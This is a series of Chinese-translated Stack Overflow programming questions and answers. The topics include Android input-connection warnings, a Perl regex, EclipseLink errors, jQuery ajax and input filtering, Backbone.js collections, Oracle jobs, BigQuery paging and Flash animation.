09-07 14:21:31.724: W/IInputConnectionWrapper(24197): getTextAfterCursor on inactive InputConnection
09-07 14:21:31.724: W/IInputConnectionWrapper(24197): getExtractedText on inactive InputConnection
09-07 14:21:31.724: W/IInputConnectionWrapper(24197): getTextBeforeCursor on inactive InputConnection
09-07 14:21:31.724: W/IInputConnectionWrapper(24197): getTextAfterCursor on inactive InputConnection
09-07 14:21:31.732: W/IInputConnectionWrapper(24197): beginBatchEdit on inactive InputConnection
09-07 14:21:31.732: W/IInputConnectionWrapper(24197): endBatchEdit on inactive InputConnection
09-07 14:21:31.732: W/IInputConnectionWrapper(24197): getExtractedText on inactive InputConnection
09-07 14:21:31.732: W/IInputConnectionWrapper(24197): getTextBeforeCursor on inactive InputConnection
09-07 14:21:31.732: W/IInputConnectionWrapper(24197): getTextAfterCursor on inactive InputConnection
09-07 14:21:31.732: W/IInputConnectionWrapper(24197): beginBatchEdit on inactive InputConnection
09-07 14:21:31.732: W/IInputConnectionWrapper(24197): endBatchEdit on inactive InputConnection
09-07 14:21:31.732: W/IInputConnectionWrapper(24197): getExtractedText on inactive InputConnection
09-07 14:21:32.013: W/IInputConnectionWrapper(24197): showStatusIcon on inactive InputConnection
09-07 14:21:32.013: W/IInputConnectionWrapper(24197): getExtractedText on inactive InputConnection
09-07 14:21:32.021: W/IInputConnectionWrapper(24197): getExtractedText on inactive InputConnection
09-07 14:21:32.021: W/IInputConnectionWrapper(24197): getTextBeforeCursor on inactive InputConnection
09-07 14:21:32.021: W/IInputConnectionWrapper(24197): getTextAfterCursor on inactive InputConnection
09-07 14:21:32.021: W/IInputConnectionWrapper(24197): getExtractedText on inactive InputConnection
09-07 14:21:32.021: W/IInputConnectionWrapper(24197): getTextBeforeCursor on inactive InputConnection
09-07 14:21:32.021: W/IInputConnectionWrapper(24197): getTextAfterCursor on inactive InputConnection
09-07 14:21:32.021: W/IInputConnectionWrapper(24197): beginBatchEdit on inactive InputConnection
09-07 14:21:32.021: W/IInputConnectionWrapper(24197): endBatchEdit on inactive InputConnection
09-07 14:21:32.021: W/IInputConnectionWrapper(24197): getExtractedText on inactive InputConnection
09-07 14:21:32.021: W/IInputConnectionWrapper(24197): getTextBeforeCursor on inactive InputConnection
09-07 14:21:32.021: W/IInputConnectionWrapper(24197): getTextAfterCursor on inactive InputConnection
09-07 14:21:32.028: W/IInputConnectionWrapper(24197): beginBatchEdit on inactive InputConnection
09-07 14:21:32.028: W/IInputConnectionWrapper(24197): endBatchEdit on inactive InputConnection
09-07 14:21:32.028: W/IInputConnectionWrapper(24197): getExtractedText on inactive InputConnection 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2020-10-19T10:24:31.620

我正在使用 webView 浏览我需要注册或登录的 URL。当我将焦点切换到不同的 TextField 时，我的应用程序冻结了，并且出现了上述相同的错误。

我如何设法解决它是它缺少下面这段关键的代码：

```
@override
void initState() {
  super.initState();
  if (Platform.isAndroid) WebView.platform = SurfaceAndroidWebView();
} 
```

此代码应位于扩展主类的实例类的声明之后和构建 Widget 函数之前。

在错误日志中，您可能仍然会看到相同的警告，但它肯定会解决所导致的任何问题，无论是 Swift 键盘还是 TextField 本身。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-11-08T20:13:08.980

在我的按钮布局中，我有这个：`android:textIsSelectable="true"`，只需删除它并解决问题......

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-02-29T15:35:49.917

猜想已经太晚了，但在我的情况下，我在文本编辑上有一个“ **setOnEditorActionListener** ”的问题——如果我删除了这个监听器，警告就消失了。

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2019-07-11T08:46:37.347

```
TextWatcher textWatcherContent = new TextWatcher() {

    @Override
    public void beforeTextChanged(CharSequence s, int start, int count, int after) {

    }

    @Override
    public void onTextChanged(CharSequence s, int start, int before, int count) {

    }

    @Override
    public void afterTextChanged(Editable s) {
        String content = mTxtContent.getText().toString();
        String contact = mTxtContact.getText().toString();
        if (null != mTxtContent && null != mTxtLength) {
            int length = mTxtContent.getText().toString().length();

            if (length > 200) {

                mTxtContent.removeTextChangedListener(textWatcherContent);
                SpannableString spannableString = new SpannableString(content);

                spannableString.setSpan(new ForegroundColorSpan(Color.parseColor("#FF3838")), 200
                            , mTxtContent.length() , Spanned.SPAN_EXCLUSIVE_EXCLUSIVE);
                mTxtContent.getText().clear();
                mTxtContent.append(spannableString);
                mTxtContent.setSelection(content.length());

                mTxtContent.addTextChangedListener(textWatcherContent);
            }          
        }
    }
}; 
```

* * *

## 回答 #5

> 赞同：-7
> 
> 时间：2014-03-27T12:35:08.360

事实证明，上述的用法`InputConnectionWrapper`是完全正确的。但是，`commitText()`永远不会被调用（特殊情况除外），因为在输入过程中会使用其他方法。这些主要是`setComposingText()`和`sendKeyEvent()`。

但是，覆盖很少使用的方法也很重要，`deleteSurroundingText()`或者`commitText()`确保捕获每个用户输入，因为我遇到了类似的问题。

我的情况：我有一个`EditText`用户输入的视图。当`EditText`用户按下按钮时，它会被清除。当我快速按下按钮时，大量不活动的`InputConnection`条目会流出。

例如`editText.setText(null);`

上面我的 logcat 中的最后一行很好地说明了正在发生的事情。果然，`InputConnection`清除文本的请求不堪重负。在尝试清除之前，我尝试修改代码以检查文本长度：

```
if (editText.length() > 0) {
    editText.setText(null);
} 
```

这有助于缓解快速按下按钮不再导致`IInputConnectionWrapper`警告流的问题。然而，当用户在输入内容和按下按钮之间快速切换或在应用程序负载足够时按下按钮等时，这仍然容易出现问题。

幸运的是，我找到了另一种清除文本的方法：`Editable.clear()`. 有了这个，我根本没有收到警告：

```
if (editText.length() > 0) {
    editText.getText().clear();
} 
```

请注意，如果您希望清除所有输入状态而不仅仅是文本（autotext、autocap、multitap、undo），您可以使用`TextKeyListener.clear(Editable e)`.

```
if (editText.length() > 0) {
    TextKeyListener.clear(editText.getText());
} 
```

If you want to know more about input connection wrapper please visit the link below.

[http://developer.android.com/reference/android/view/inputmethod/InputConnection.html](http://developer.android.com/reference/android/view/inputmethod/InputConnection.html)

# regex - perl中的正则表达式匹配空间

> ID：12318523
> 
> 赞同：0
> 
> 时间：2012-09-07T12:52:29.043
> 
> 标签：regex, perl

我正在尝试匹配

`Begin_Page {Some Number}`

在试图避免的同时

`Begin_Page_{Some Number}`

我试过了

`$line =~ m/^Begin_Page\s/`

但我注意到它有时与任何文件都不匹配，而肯定有`Begin_Page 8703`

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-07T13:02:51.317

您的正则表达式是正确的；该行应匹配：

```
while (<DATA>) {
    if (/^Begin_Page\s/) { print "OK: " }
    else                 { print "KO: " }
    print;
} 
```

```
__DATA__
test
1233
Begin_Page 123
Begin_Page_456
Begin_Page 8703 
```

输出：

```
KO: test
KO: 1233
OK: Begin_Page 123
KO: Begin_Page_456
OK: Begin_Page 8703 
```

# jpa - org.eclipse.persistence.exceptions.DescriptorException 与 java.lang.NoSuchField 异常

> ID：12318525
> 
> 赞同：0
> 
> 时间：2012-09-07T12:52:32.813
> 
> 标签：jpa, jpa-2.0

我有一个名为 TrainingMstr 的实体。我已经从表中删除了一些字段并更新了实体。但我仍然收到以下错误：

```
Error occurred during deployment: Exception while preparing the app : Exception [EclipseLink-0] (Eclipse Persistence Services - 2.3.2.v20111125-r10461): org.eclipse.persistence.exceptions.IntegrityException
Descriptor Exceptions: 
---------------------------------------------------------
Exception [EclipseLink-59] (Eclipse Persistence Services - 2.3.2.v20111125-r10461): org.eclipse.persistence.exceptions.DescriptorException
Exception Description: The instance variable [trngRevNo] is not defined in the domain class [com.discusit.trims.entity.TrainingMstr], or it is not accessible.
Internal Exception: java.lang.NoSuchFieldException: trngRevNo
Mapping: org.eclipse.persistence.mappings.DirectToFieldMapping[trngRevNo-->trimsdev.trimsdev.training_mstr.trng_rev_no]
Descriptor: RelationalDescriptor(com.discusit.trims.entity.TrainingMstr --> [DatabaseTable(trimsdev.trimsdev.training_mstr)])
Exception [EclipseLink-59] (Eclipse Persistence Services - 2.3.2.v20111125-r10461): org.eclipse.persistence.exceptions.DescriptorException
Exception Description: The instance variable [trngRefDocNo] is not defined in the domain class [com.discusit.trims.entity.TrainingMstr], or it is not accessible.
Internal Exception: java.lang.NoSuchFieldException: trngRefDocNo
Mapping: org.eclipse.persistence.mappings.DirectToFieldMapping[trngRefDocNo-->trimsdev.trimsdev.training_mstr.trng_ref_doc_no]
Descriptor: RelationalDescriptor(com.discusit.trims.entity.TrainingMstr --> [DatabaseTable(trimsdev.trimsdev.training_mstr)])
Exception [EclipseLink-59] (Eclipse Persistence Services - 2.3.2.v20111125-r10461): org.eclipse.persistence.exceptions.DescriptorException
Exception Description: The instance variable [trngAddLinks] is not defined in the domain class [com.discusit.trims.entity.TrainingMstr], or it is not accessible.
Internal Exception: java.lang.NoSuchFieldException: trngAddLinks
Mapping: org.eclipse.persistence.mappings.DirectToFieldMapping[trngAddLinks-->trimsdev.trimsdev.training_mstr.trng_add_links]
Descriptor: RelationalDescriptor(com.discusit.trims.entity.TrainingMstr --> [DatabaseTable(trimsdev.trimsdev.training_mstr)])
Exception [EclipseLink-59] (Eclipse Persistence Services - 2.3.2.v20111125-r10461): org.eclipse.persistence.exceptions.DescriptorException
Exception Description: The instance variable [trngNxtRevDt] is not defined in the domain class [com.discusit.trims.entity.TrainingMstr], or it is not accessible.
Internal Exception: java.lang.NoSuchFieldException: trngNxtRevDt
Mapping: org.eclipse.persistence.mappings.DirectToFieldMapping[trngNxtRevDt-->trimsdev.trimsdev.training_mstr.trng_nxt_rev_dt]
Descriptor: RelationalDescriptor(com.discusit.trims.entity.TrainingMstr --> [DatabaseTable(trimsdev.trimsdev.training_mstr)])
Exception [EclipseLink-59] (Eclipse Persistence Services - 2.3.2.v20111125-r10461): org.eclipse.persistence.exceptions.DescriptorException
Exception Description: The instance variable [trngInfo] is not defined in the domain class [com.discusit.trims.entity.TrainingMstr], or it is not accessible.
Internal Exception: java.lang.NoSuchFieldException: trngInfo
Mapping: org.eclipse.persistence.mappings.DirectToFieldMapping[trngInfo-->trimsdev.trimsdev.training_mstr.trng_info]
Descriptor: RelationalDescriptor(com.discusit.trims.entity.TrainingMstr --> [DatabaseTable(trimsdev.trimsdev.training_mstr)])
Exception [EclipseLink-59] (Eclipse Persistence Services - 2.3.2.v20111125-r10461): org.eclipse.persistence.exceptions.DescriptorException
Exception Description: The instance variable [trngEffctvDt] is not defined in the domain class [com.discusit.trims.entity.TrainingMstr], or it is not accessible.
Internal Exception: java.lang.NoSuchFieldException: trngEffctvDt
Mapping: org.eclipse.persistence.mappings.DirectToFieldMapping[trngEffctvDt-->trimsdev.trimsdev.training_mstr.trng_effctv_dt]
Descriptor: RelationalDescriptor(com.discusit.trims.entity.TrainingMstr --> [DatabaseTable(trimsdev.trimsdev.training_mstr)])
Exception [EclipseLink-59] (Eclipse Persistence Services - 2.3.2.v20111125-r10461): org.eclipse.persistence.exceptions.DescriptorException
Exception Description: The instance variable [trngValidTill] is not defined in the domain class [com.discusit.trims.entity.TrainingMstr], or it is not accessible.
Internal Exception: java.lang.NoSuchFieldException: trngValidTill
Mapping: org.eclipse.persistence.mappings.DirectToFieldMapping[trngValidTill-->trimsdev.trimsdev.training_mstr.trng_valid_till]
Descriptor: RelationalDescriptor(com.discusit.trims.entity.TrainingMstr --> [DatabaseTable(trimsdev.trimsdev.training_mstr)]) 
```

我也从所有 SessionBeans 中删除了所有相关的数据字段。

我该怎么办？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-24T13:48:52.670

好像您没有正确重新部署您的应用程序。确保您已重新启动服务器并重新编译和重新部署您的应用程序。

# ajax - jquery ajax 调用未按预期工作

> ID：12318533
> 
> 赞同：1
> 
> 时间：2012-09-07T12:53:12.097
> 
> 标签：ajax, jquery

我有一个 ajax 调用，如下所示：

```
$("#loginForm").submit(function(e){
           $.ajax({
                type:'POST',
                url:'login.php',
                data: $("#loginForm").serialize();
                success: function(data){

                        if(data=="1"){
                        $("#message").html('<span class="gmessage">You are already logged in!</span>');
                        }
                        else if(data=="2"){
                            $("#message").html('<span class="gmessage">You have been logged in!</span><br/>'
                                               '<span class="bmessage">You will be redirected in 10 seconds</span>');
                            $("#message").fadeOut(1000, function(){
                                window.location = <?php echo $_SESSION['ref'];?>;
                            });
                        }
                        else if(data=="3"){
                             $("#message").html('<span class="rmessage">The password you entered was incorrect</span>');
                        }
                        else if(data=="4"){
                             $("#message").html('<span class="rmessage">That account does not exist, you may need to register for an account</span>');
                        }
                        else{
                            $("#message").html('<span class="rmessage">There was an error: please try again</span>');
                        }

                }

           });
           e.preventDefault();
        }); 
```

php 已经过测试，并且根据跨度中的消息按预期运行，但是当执行此 ajax 调用时，不会显示任何消息，那就是它是否正在执行。对应的html是这样的：

```
 <tr>
         <td id="message" name="message" colspan="2"></td>
       </tr>
        <tr>
         <td colspan="2" style="height:50px">
           <center>
                <input type="submit" name="submit" id="submit" value="Login!" style="font-family: arial;font-size:14pt;"/><br/><br/>
                <span class="registerSpan">Don't have an account?:</span><br/><br/>
                <input type="button" onClick="parent.location='createacct.php'" style="font-family:arial; font-size:14pt;" value="Register"/>
          </center>
         </td>
        </tr> 
```

为什么这不起作用？另一个相关问题：ajax 是处理这个问题的最佳方式吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-07T13:49:49.343

除了@Alexander 指出的明显语法错误之外，您还应该通过`dataType: "text"`告诉 jQuery 期望什么数据。

此外，如果您使用带有 HTTP 状态代码的 json 会更好。成功功能可能看起来像

```
success(function(result) {
    var message = '<span class="gmessage">Some Initial text</span>';
    if(result.status == 200) {
        message = '<span class="gmessage">' + result.message + '</span>';
    }
    else if (result.status == 401) {
        .......
    }
    $('#message').html(message);
} 
```

显然有一些方法可以通过使用模板来进一步优化这一点，而不是进行大量的 DOM 操作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-07T13:03:12.643

使用[jsfiddle 的](http://jsfiddle.net)jslint 检查器，我对代码中存在的一些语法错误进行了排序。

```
$("#loginForm").submit(function(e){
       $.ajax({
            type:'POST',
            url:'login.php',
            data: $("#loginForm").serialize(),
            success: function(data){

                    if(data=="1"){
                    $("#message").html('<span class="gmessage">You are already logged in!</span>');
                    }
                    else if(data=="2"){
                        $("#message").html('<span class="gmessage">You have been logged in!</span><br/><span class="bmessage">You will be redirected in 10 seconds</span>');
                        $("#message").fadeOut(1000, function(){
                            window.location = <?php echo $_SESSION['ref'];?>;
                        });
                    }
                    else if(data=="3"){
                         $("#message").html('<span class="rmessage">The password you entered was incorrect</span>');
                    }
                    else if(data=="4"){
                         $("#message").html('<span class="rmessage">That account does not exist, you may need to register for an account</span>');
                    }
                    else{
                        $("#message").html('<span class="rmessage">There was an error: please try again</span>');
                    }

            }

       });
       e.preventDefault();
    });​ 
```

# backbone.js - 骨干.js如何用整个数据库表填充集合

> ID：12318537
> 
> 赞同：-1
> 
> 时间：2012-09-07T12:53:29.107
> 
> 标签：backbone.js, backbone.js-collections

我已经定义了 a`Model`和 a `Collection`，并且由于我的数据库中已经有记录，我希望在页面加载时在应用程序中显示所有这些记录。

我尝试使用`Backbone.sync`，但在 Chrome 调试模式下仍然看到一个空集合。

我的 Backbone.js 代码：

[http://jsfiddle.net/GhaPF/15/](http://jsfiddle.net/GhaPF/15/) （由于模板依赖性，我不得不在那里删除一些代码）。

```
$(document).ready(function() {

    var Item = Backbone.Model.extend({
        defaults: { "date": "",
                    "text": "default text"
                },
        initialize: function() {      // STEP 3
            var dateString = giveMeDate();
            this.set("date", dateString);
        },
        urlRoot : './items'
    });

    var ItemList = Backbone.Collection.extend({
        model: Item,
        url: './items/',
        initialize: function() {
            this.fetch();
        }
    });

   //************ VIEW ********************************
    var ItemListView1 = Backbone.View.extend({
        el: 'body',
        initialize: function(myitemList) {
            this.itemlist = myitemList;
            this.itemlist.bind('add', this.addOneItem, this);
            this.render();
        },
        addOneItem: function() {
            this.render();
        },
        render: function() {                // STEP 5       this is called because add() is bound to this.render (in initialization of this View)
            text = this.itemlist.toJSON();
            string = JSON.stringify(text);
            $("#view1").html('');
            $.tmpl("itemTemplate", text).appendTo("#view1");
            return this;
        },
        events: {
            "keypress #new-item":  "createOnEnter"    // STEP 1
        },
        createOnEnter: function(e) {
          if (e.keyCode != 13) return;
          if (!$("#new-item").val()) return;
          this.itemlist.create({"text": $("#new-item").val()});   // STEP 2
          $("#new-item").val('');
        }
    });

    $("#new-item").focus();
    var itemlist = new ItemList();
    Backbone.sync("read", itemlist);
    var myitemListView = new ItemListView1(itemlist); 
```

这是我在 Backbone.sync 之后在集合中看到的内容：

```
d
_byCid: Object
_byId: Object
length: 0
models: Array[0]
__proto__: x 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-07T13:07:30.307

1.  您可能不应该直接调用同步，因为该方法可能会被其他同步方法覆盖（用于支持 localStorage、IndexedDB、couchdb 或其他）。Sync 更像是一个“存储驱动程序”。

2.  您应该调用 fetch 来填充您的集合。所以在你的代码中，它应该是这样的：

    ```
    itemlist.fetch({success: function (models) {
       console.log("got", models);
    });
    var myitemListView = new ItemListView1({collection: itemList}); 
    ```

3.  在页面加载后立即使用异步获取填充您的集合被认为是“糟糕的风格”。您通常应该使用与页面一起发送的代码填充它，并且仅使用 fetch 对集合进行后续更新。

在上面的代码示例中，如果您坚持执行异步获取，您可能希望延迟创建视图，直到您实际填充了集合，以避免当列表从空变为填充时不必要的闪烁（视图绑定到集合并在提取完成时重置）。

# c++ - 如果我需要每秒读取文件 0...5 次，是否值得保持文件描述符打开？

> ID：12318538
> 
> 赞同：0
> 
> 时间：2012-09-07T12:53:30.787
> 
> 标签：c++, audio, mp3, usability, wav

我用 C++ 开发跨平台音频编辑器，它以每秒 0...5 次的速度读取媒体文件（在播放模式下或在屏幕上重新绘制声音时）。该实现打开一个文件并在对该文件的所有读取操作之间保持打开描述符。

我认为即使打开该文件也不禁止任何文件操作对用户更友好。我会允许用户在播放时删除该文件（如果他/她愿意）。在下一次尝试从该文件读取下一个块失败后，程序将停止播放。

**在现代 Windows / Linux / Mac OS 系统上，open()/close() 操作是否昂贵？**

但是打开（）/关闭（）巨大的 MP3 文件会很困难，因为 MP3 的“seek（）”可能很昂贵（在需要的块之前读取所有块的标题）。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-08T04:04:48.433

许多专业音频应用程序（或至少一些）在播放期间保持文件打开并在不播放时关闭文件 - 它足够快，可以在需要重绘时打开和查找。但是，Pro 音频应用程序本身不能与 MP3 等格式一起使用——它们总是首先转换为未压缩的格式。造成这种情况的原因之一是 MP3 的采样精确查找时间要差得多**。**理论上，如果没有任何变化，MP3 阅读库可以关闭文件并重新打开它停止的地方，但我认为 MP3 库不支持这一点。相比之下，未压缩的文件非常快速且易于查找。

回到您的问题：您是否要在每次屏幕重绘时重新打开并重新搜索，并且在播放期间经常重新搜索？好吧，你可以，而且与保持打开状态相比，它甚至可能不是屏幕重绘的拖累。现代机器肯定可以在播放过程中保持足够的缓冲，特别是如果它只是一个文件，所以这也是可行的。如果你真的想这样做，你应该做一些测试，看看性能受到什么影响，看看你是否真的想为此减慢用户的机器速度。

你还问什么更“友好”？您建议用户可以在另一个应用程序中“更改”文件，但是如何以及为什么？例如，如果您的程序试图在用户“更改”它的那一刻重新打开，会发生什么？更改可能涉及用另一个文件替换它，但许多应用程序通过首先删除原始文件，然后写入替换（或将替换移动到位）来“替换”文件。那么如果您的应用程序试图在错误的时刻打开文件会发生什么？它会说，“哦，文件不见了，我现在停止播放。” 更糟糕的是，当仅部分写入替换时，程序会打开。呸。我可以想象更糟，但这是一个开始。

如果您需要写入文件（例如对于 ID3 标签），这通常可以通过以 RW 模式打开文件（或重新打开已打开的文件描述符）来完成，因为它通常涉及覆盖数据或修改末尾的数据文件。我不建议在播放过程中进行任何更改播放样本数量、播放样本位置等的操作，除非您非常仔细地计划，因为情况充满了竞争条件。如果你这样做了，你应该在你自己的应用程序中这样做，因为这些比赛更容易控制。

所以也许这是值得的，但我强烈建议不要这样做。如果另一个应用程序写得不好，可能会发生不好的事情。

# dynamics-crm-2011 - CRM 2011 - 在托管解决方案中禁用后仍显示系统视图

> ID：12318542
> 
> 赞同：3
> 
> 时间：2012-09-07T12:53:35.480
> 
> 标签：dynamics-crm-2011

我开发了一个托管解决方案，后来我将其导入另一个组织。在此解决方案中，我为帐户实体创建了新视图并停用了系统视图，因为它们不需要。因此，在最初的组织中这很好，但在使用托管解决方案的组织中，系统视图仍然出现，以及我创建的新视图。

是否有我错过的设置在导入解决方案后阻止这些出现？

谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-07T18:21:10.400

记录的状态与其所在的解决方案无关。因此，在您的情况下，您假设您可以导出处于“非活动”状态的视图，但不幸的是这是不可能的——您只能导出记录，不是它的状态。默认情况下，它将在导入时处于活动状态。

您可以通过查看导出的解决方案 XML 文件来确认这一点。观察您感兴趣的“SavedQuery”，并注意我们没有任何与活动/非活动相关的元数据：

```
 <savedquery>
    <IsCustomizable>1</IsCustomizable>
    <CanBeDeleted>1</CanBeDeleted>
    <isquickfindquery>0</isquickfindquery>
    <isprivate>0</isprivate>
    <isdefault>0</isdefault>
    <returnedtypecode>1</returnedtypecode>
    <savedqueryid>{guid}</savedqueryid> 
```

至于如何处理：如果您需要将解决方案导出到少数组织，最好手动禁用将解决方案导入到的每个组织中的视图。但是，如果您打算将此解决方案导入许多组织，您可以编写一个小程序来使用 SDK API 来禁用您想要禁用的视图，并在您导入解决方案后运行它。希望有帮助。

# google-bigquery - Bigquery Java API 查询小于记录的限制

> ID：12318546
> 
> 赞同：2
> 
> 时间：2012-09-07T12:54:00.223
> 
> 标签：google-bigquery

我正在对应该返回大约 11K 行的 BigQuery 表进行请求。但是，我不能在一个 GetQueryResultsResponse 中获得超过 2400 行，其他行必须通过分页访问。

我检查了文档，它说响应可以大到 64K 行或 10M JSON，而我的响应远低于（1M JSON 和 2400 行），所以我不明白为什么我的结果被分页。

Java API 中是否存在限制行数的隐藏参数？

问候，大卫

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-07T14:31:08.053

您是否传递了[此处](https://developers.google.com/bigquery/docs/reference/v2/jobs/getQueryResults?hl=ar)`maxResults`描述的参数？看起来文档在这方面有点误导，因为它们表明我们默认返回最大大小。为了节省带宽，我们默认只返回 512 行。这是基于大多数人对整个结果并不真正感兴趣的假设，如果他们是，他们可以使用参数或翻阅结果。`maxResults`

# protobuf-net - Protobuf-net [ProtoAfterSerialization] 异常案例

> ID：12318551
> 
> 赞同：1
> 
> 时间：2012-09-07T12:54:16.493
> 
> 标签：protobuf-net

Protobuf-net 允许以下属性：

```
[ProtoBeforeSerialization]
[ProtoAfterSerialization] 
```

如果序列化过程中出现异常，会调用[ProtoAfterSerialization]方法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-07T13:04:44.327

不，不会的。

我怀疑可能会出现更长的答案，但我不确定我还能添加什么......

# javascript - 只有 IE8 html 文本框中的字符

> ID：12318552
> 
> 赞同：3
> 
> 时间：2012-09-07T12:54:23.690
> 
> 标签：javascript, jquery, internet-explorer, internet-explorer-8

我想限制用户在 html 文本框中只输入字符。我正在使用以下代码

```
 $('.alphaonly').live("input", function () {
     $(this).val($(this).val().replace(/[^A-Za-zÀ-ÿ ]/g, ''));
 }); 
```

这在 IE9 中运行良好，但在 IE8 中失败。

谁能帮我修一下？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-07T13:02:18.030

我的意思是使用插件要容易得多：

[http://www.thimbleopensource.com/tutorials-snippets/jquery-plugin-filter-text-input](http://www.thimbleopensource.com/tutorials-snippets/jquery-plugin-filter-text-input)

```
$('#text_input').filter_input({regex:'[a-z]'}); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-07T12:56:57.147

对旧版浏览器使用`keyup`and事件：`mouseup`

```
 $('.alphaonly').on("keyup mouseup input", function () {
     $(this).val($(this).val().replace(/[^A-Za-zÀ-ÿ ]/g, ''));
 });​ 
```

`input`IE < 9 不支持该事件。您可以使用和完成*几乎*相同的功能。此外，从 jQuery 1.7 开始，不推荐使用.`keyup``mouseup``.live()`[`.on()`](http://api.jquery.com/on/)

**[演示](http://jsfiddle.net/QL8Mh/)**。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-07T12:58:20.863

```
Try this ...
$('.alphaonly').live({
   keyup : function () {
     $(this).val($(this).val().replace(/[^A-Za-zÀ-ÿ ]/g, ''));
   }
}); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-01-15T04:37:24.080

```
//If you consider doing it plain JavaScript way, without JQuery      
 function lettersOnly(evt) {
   evt = (evt) ? evt : event;
   var charCode = (evt.charCode) ? evt.charCode : ((evt.keyCode) ? evt.keyCode :
      ((evt.which) ? evt.which : 0));
   if (charCode > 31 && (charCode < 65 || charCode > 90) &&
      (charCode < 97 || charCode > 122)) {
      alert("Enter letters only.");
      return false;
   }
   return true;
 } 
```

# oracle - DBMS_JOB 如何将自己标记为已损坏？

> ID：12318553
> 
> 赞同：1
> 
> 时间：2012-09-07T12:54:24.763
> 
> 标签：oracle, scheduling, jobs

我想以 1000 行为单位对大量行进行更新。当将更新语句放入一些定期执行的 DBMS_JOB 中时，是否有办法在受影响的行数变为零后让作业自行挂起？

一个工作可以找到它自己的工作 ID 以便它可以调用`DBMS_JOB.Broken()`吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-07T13:05:19.090

```
select JOB from all_jobs
where what like '%YOUR_JOB_PROCEDURE%'; 
```

另外，我建议使用 DBMS_SCHEDULER 而不是 DBMS_JOB，如果它在您的 Oracle 版本中也可用 [http://docs.oracle.com/cd/B19306_01/appdev.102/b14258/d_sched.htm](http://docs.oracle.com/cd/B19306_01/appdev.102/b14258/d_sched.htm)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-07T12:57:02.267

JOB ID 是 JOB 列：

```
select * from dba_jobs 
```

当前正在运行的作业：

```
select dbr.sid, s.serial#, s.username, dbj.* 
from dba_jobs_running dbr, dba_jobs dbj , v$session s 
where dbr.job=dbj.job and s.sid=dbr.sid; 
```

# jquery - jquery函数，误解。需要解释

> ID：12318560
> 
> 赞同：0
> 
> 时间：2012-09-07T12:55:12.923
> 
> 标签：jquery, function

我看过很多教程，在演示中我看到了这样的内容：

```
// my dummy example
$(function() {
    $('a.change').bind('click',function(event){
        $('body').css('background','#27272')
    });
}); 
```

我不明白`$(function() {`在做什么以及为什么它不起作用？在不破坏其他代码的情况下，我该怎么做才能使其正常工作？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-07T13:01:07.313

`$(function() {})`是`$(document).ready(handler)`更多信息的简码可以在[这里找到](http://api.jquery.com/ready/)

您发布的代码不应该破坏任何东西。也许您可以提供一个 jsfiddle 供我们研究。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-07T12:59:37.980

`$(function() {`是一个快捷方式：`$(document).ready(function() { ... });`. 后一个版本更具可读性。这意味着您放在大括号之间的代码将在`document`对象触发它的`ready`事件时执行。

这会破坏任何东西的唯一真正原因是，如果您将此代码放在页面中而没有首先包含`jquery.js`，或者您将其放在错误的位置。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-09-07T13:00:05.317

它记录在官方文档中： http: [//api.jquery.com/jQuery/#jQuery3](http://api.jquery.com/jQuery/#jQuery3)

> jQuery( callback ) 当 DOM 准备好时执行的函数。

所以，基本上，一旦 DOM 被加载并准备好被搞砸，回调函数就会被调用。如果您不使用它，节点可能不可用，尤其是在 HTML 树顶部的脚本中。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-09-07T13:03:31.713

好的，我认为您对匿名函数感到困惑。一个匿名函数——和其他函数一样，只是没有名字。它通常作为另一个函数的参数创建：

```
$('body').fadeIn('1000',function() {
    alert('yay!');
}); 
```

它是一次性使用的（所以没有使用函数名）。

我怀疑它对您不起作用，因为它没有作为有效参数传递。我`$`怀疑是 jQuery 对象，通常需要另一个 jQuery 对象或字符串作为参数，而不是匿名函数（除非它返回有意义的东西）。但是，参数 to`bind`已创建 OK。

现在，您可能想做的是创建一个自调用匿名函数。在这种情况下，语法也可能是：

```
(function($) {
    $('a.change').bind('click',function(event){
        $('body').css('background','#27272')
    });
})(jQuery); 
```

这将创建一个匿名函数，然后执行它（括号最后带有一个参数）。

[编辑]

哦，很抱歉提供了一条误导性的信息，让我澄清一下：您使用的语法也是有效的，因为 jQuery 对象将在加载 DOM 后执行其中包含的函数（回调）。所以它实际上是有效的语法。

# performance - 使用双缓冲画布的简单动画不流畅

> ID：12318562
> 
> 赞同：2
> 
> 时间：2012-09-07T12:55:23.233
> 
> 标签：performance, actionscript-3, flash, animation, doublebuffered

我尝试使用双缓冲区来开发一个简单的 Flash 游戏来绘制动画。

重绘发生在 Event.ENTER_FRAME 被触发时。

用于双缓冲的后缓冲是 BitmapData 类型。

动画非常简单：我在后台缓冲区中绘制了一个 20x20 像素的位图，随着 x 坐标的增加，它应该从画布的左侧平滑地移动到右侧。这基本上可以正常工作，但如果你仔细观察，你会发现这个运动有很大的中断。这似乎与帧速率无关，因为它经常超过 60。平滑移动的中断对于动画来说是不可接受的，但我很确定我在双缓冲方面没有做错任何事情，所以我我害怕这可能是 Flash 播放器的问题或其他什么...如果不是这种情况，我会很欣慰

请看一下显示简单动画的 swf：

[https://dl.dropbox.com/u/55967135/test.swf](https://dl.dropbox.com/u/55967135/test.swf)

（顺便说一句。当运动基于两帧之间的时间时，动画的中断也不会消失 - 现在每帧恒定 2 个像素。）

